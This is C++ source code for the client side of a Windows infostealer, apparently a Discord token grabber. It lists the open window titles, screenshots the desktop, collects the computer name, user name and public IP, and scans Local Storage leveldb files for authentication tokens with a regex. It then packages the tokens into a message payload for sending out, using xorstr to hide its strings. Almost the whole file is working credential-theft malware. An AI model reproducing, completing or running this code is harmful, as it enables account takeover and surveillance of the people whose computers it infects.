#include <Windows.h>
#include <vector>
#include <GdiPlus.h>
#include <regex>
#include <filesystem>

#include "functions.h"
#include "..\utility\xor.hpp"
#include "../utility/requests.h"
#include "../utility/helper.h"

#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"Wininet.lib")
#pragma comment(lib,"gdiplus.lib")
#pragma comment(lib,"Gdi32.lib")

using namespace Gdiplus;
namespace fs = std::filesystem;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM param)
{
	int length = GetWindowTextLength(hwnd);

	if (IsWindowVisible(hwnd) && length > 0)
	{
		char* buffer = new char[length + 1];
		GetWindowText(hwnd, buffer, length + 1);
		std::string title(buffer);

		if (title == xorstr_("Settings"))
			return true;
		else if (title == xorstr_("Movies & TV"))
			return true;
		else if (title == xorstr_("Microsoft Store"))
			return true;
		else if (title == xorstr_("Microsoft"))
			return true;

		title.erase(title.find_last_not_of(" \n\r\t") + 1);
		(*(std::vector<std::string>*)param).push_back(title + "\n");
	}
	return true;
}

namespace client {
	namespace functions {
		std::vector<std::string> get_all_windows()
		{
			std::vector<std::string> windows{};
			EnumWindows(EnumWindowsProc, (LPARAM)&windows);
			return windows;
		}

		void take_screenshot(std::string file) {
			ULONG_PTR gdiplustoken;
			GdiplusStartupInput gdistartupinput;
			GdiplusStartupOutput gdistartupoutput;

			gdistartupinput.SuppressBackgroundThread = true;
			GdiplusStartup(&gdiplustoken, &gdistartupinput, &gdistartupoutput); //start GDI+

			HDC dc = GetDC(GetDesktopWindow());//get desktop content
			HDC dc2 = CreateCompatibleDC(dc);	 //copy context

			RECT rc0kno;  // rectangle  Object

			GetClientRect(GetDesktopWindow(), &rc0kno);// get desktop size;
			int w = rc0kno.right - rc0kno.left;//width
			int h = rc0kno.bottom - rc0kno.top;//height

			HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h);  //create bitmap
			HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);

			BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);  //copy pixel from pulpit to bitmap
			Bitmap* bm = new Bitmap(hbitmap, NULL);

			UINT num;
			UINT size;

			ImageCodecInfo* imagecodecinfo;
			GetImageEncodersSize(&num, &size); //get count of codec

			imagecodecinfo = (ImageCodecInfo*)(malloc(size));
			GetImageEncoders(num, size, imagecodecinfo);//get codec

			CLSID clsidEncoder;

			for (int i = 0; i < num; i++)
			{
				if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
					clsidEncoder = imagecodecinfo[i].Clsid;   //get jpeg codec id

			}

			free(imagecodecinfo);

			std::wstring ws;
			ws.assign(file.begin(), file.end());  //sring to wstring
			bm->Save(ws.c_str(), &clsidEncoder);   //save in jpeg format
			SelectObject(dc2, holdbitmap);  //Release Objects
			DeleteObject(dc2);
			DeleteObject(hbitmap);

			ReleaseDC(GetDesktopWindow(), dc);
			GdiplusShutdown(gdiplustoken);
		}

		std::string get_computer_info() {
#define INFO_BUFFER_SIZE 32767
			TCHAR  infoBuf[INFO_BUFFER_SIZE];
			DWORD  bufCharCount = INFO_BUFFER_SIZE;

			std::string payload = "";

			GetComputerName(infoBuf, &bufCharCount);
			payload += "Computer name: " + std::string(infoBuf);

			payload += "\n";

			GetUserName(infoBuf, &bufCharCount);
			payload += "Username: " + std::string(infoBuf);

			return payload;
		}

		std::string get_ip() {
			auto response = requests::get_request("https://api.ipify.org/");
			return response;
		}

		std::vector<std::string> get_tokens() {
			struct stat info;

			std::vector<std::string> tokens = {};
			for (auto path : helpers::paths) {
				if (!(stat(path.second.c_str(), &info) != 0) && info.st_mode & S_IFDIR) {
					if (!(info.st_mode & S_IFDIR)) {
						continue;
					}

					path.second += xorstr_("\\Local Storage\\leveldb");

					for (const auto& entry : fs::directory_iterator(path.second)) {
						if (fs::path(entry.path()).extension().string() != xorstr_(".log") && fs::path(entry.path()).extension().string() != xorstr_(".ldb")) {
							continue;
						}

						std::smatch match;
						std::string content = helpers::read_file(entry.path().string().c_str());

						std::string::const_iterator search_start(content.cbegin());
						while (std::regex_search(search_start, content.cend(), match, std::regex(helpers::regex_token))) {
							tokens.push_back(match[0]);
							search_start = match.suffix().first;
						}
					}
				}
			}
			return tokens;
		}

		std::string prepare_payload(std::string title, std::vector<std::string> tokens) {
			std::string payload = std::string(xorstr_("cmd=send_message&content=")) + std::string("**") + title + std::string("**") + std::string("\n```\n");
			for (auto token : tokens) {
				payload += token + xorstr_("\n");
			}

			payload += xorstr_("```\n");

			return payload;
		}
	}
}